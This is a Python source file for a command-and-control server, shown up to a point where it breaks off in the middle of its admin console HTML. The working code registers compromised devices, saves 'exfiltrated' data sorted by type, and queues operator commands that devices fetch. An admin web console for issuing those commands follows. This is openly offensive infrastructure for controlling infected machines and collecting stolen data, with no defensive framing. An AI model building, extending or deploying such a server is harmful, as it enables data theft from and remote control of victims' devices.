#!/usr/bin/env python3

import json
import logging
import os
import ssl
import threading
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn

# Global configuration variables
C2_SERVER_PORT = 42069
ADMIN_CONSOLE_PORT = 8080

# Setup directories for storing data
DATA_DIR = "c2_data"
CERTS_DIR = os.path.join(DATA_DIR, "certs")
EXFIL_DIR = os.path.join(DATA_DIR, "exfiltrated")

# Ensure directories exist
for directory in [DATA_DIR, CERTS_DIR, EXFIL_DIR]:
    os.makedirs(directory, exist_ok=True)

# Setup logging
logging.basicConfig(
    filename='c2_server.log',
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger('C2Server')

# Also log to console
console = logging.StreamHandler()
console.setLevel(logging.INFO)
logger.addHandler(console)

# Store registered devices
registered_devices = {}

# Store commands to be sent to devices
device_commands = {}

class C2RequestHandler(BaseHTTPRequestHandler):
    def _set_headers(self, content_type='application/json'):
        self.send_response(200)
        self.send_header('Content-Type', content_type)
        self.end_headers()
    
    def _handle_error(self, status_code=400, message="Bad Request"):
        self.send_response(status_code)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps({"error": message}).encode())
    
    def do_GET(self):
        # Default response for any unhandled GET request
        if self.path == '/':
            self._set_headers(content_type='text/html')
            self.wfile.write(b"<html><body><h1>C2 Server Running</h1></body></html>")
        else:
            self._handle_error(404, "Not Found")
    
    def do_POST(self):
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))
            
            # Registration endpoint
            if self.path == '/register':
                self._handle_registration(data)
            
            # Exfiltration endpoint
            elif self.path == '/exfil':
                self._handle_exfiltration(data)
            
            # Command retrieval endpoint
            elif self.path == '/command':
                self._handle_command_retrieval(data)
            
            # Default response for unhandled POST requests
            else:
                self._handle_error(404, "Not Found")
                
        except Exception as e:
            logger.error(f"Error handling request: {str(e)}")
            self._handle_error(500, f"Internal Server Error: {str(e)}")
    
    def _handle_registration(self, data):
        device_id = data.get('device_id')
        if not device_id:
            return self._handle_error(400, "Missing device_id")
        
        # Store device information
        registered_devices[device_id] = {
            "last_seen": datetime.now(),
            "info": data,
            "ip": self.client_address[0]
        }
        
        logger.info(f"Device registered: {device_id} from {self.client_address[0]}")
        
        # Respond with success
        self._set_headers()
        self.wfile.write(json.dumps({
            "status": "registered",
            "device_id": device_id
        }).encode())
    
    def _handle_exfiltration(self, data):
        device_id = data.get('device_id')
        if not device_id:
            return self._handle_error(400, "Missing device_id")
        
        data_type = data.get('type', 'unknown')
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Store exfiltrated data
        exfil_path = os.path.join(EXFIL_DIR, data_type)
        os.makedirs(exfil_path, exist_ok=True)
        
        filename = f"{device_id}_{timestamp}.json"
        with open(os.path.join(exfil_path, filename), 'w') as f:
            json.dump(data, f, indent=2)
        
        logger.info(f"Received {data_type} data from {device_id}")
        
        # Update device last seen time
        if device_id in registered_devices:
            registered_devices[device_id]["last_seen"] = datetime.now()
        
        # Respond with success
        self._set_headers()
        self.wfile.write(json.dumps({
            "status": "received",
            "message": f"Received {data_type} data"
        }).encode())
    
    def _handle_command_retrieval(self, data):
        device_id = data.get('device_id')
        if not device_id:
            return self._handle_error(400, "Missing device_id")
        
        # Get commands for the device
        commands = device_commands.get(device_id, [])
        
        # Update device last seen time
        if device_id in registered_devices:
            registered_devices[device_id]["last_seen"] = datetime.now()
        
        # If commands exist for this device, log them
        if commands:
            logger.info(f"Sending {len(commands)} commands to {device_id}")
        
        # Respond with commands
        self._set_headers()
        self.wfile.write(json.dumps({
            "commands": commands
        }).encode())
        
        # Clear sent commands
        device_commands[device_id] = []

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle requests in a separate thread."""
    pass

class AdminRequestHandler(BaseHTTPRequestHandler):
    def _set_headers(self, content_type='text/html'):
        self.send_response(200)
        self.send_header('Content-Type', content_type)
        self.end_headers()
    
    def do_GET(self):
        if self.path == '/':
            self._serve_admin_console()
        elif self.path == '/devices':
            self._serve_devices_json()
        elif self.path == '/exfil':
            self._serve_exfil_data()
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Not Found")
    
    def do_POST(self):
        if self.path == '/send_command':
            self._handle_send_command()
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Not Found")
    
    def _serve_admin_console(self):
        self._set_headers()
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>C2 Admin Console</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 20px; }}
                h1, h2 {{ color: #333; }}
                table {{ border-collapse: collapse; width: 100%; }}
                th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
                tr:nth-child(even) {{ background-color: #f2f2f2; }}
                th {{ background-color: #4CAF50; color: white; }}
                .command-form {{ margin: 20px 0; padding: 10px; border: 1px solid #ddd; }}
                input, select, button {{ padding: 5px; margin: 5px; }}
            </style>
        </head>
        <body>
            <h1>C2 Server Admin Console</h1>
            <p>Server running on port {C2_SERVER_PORT}</p>
            
            <h2>Registered Devices</h2>
            <div id="devices">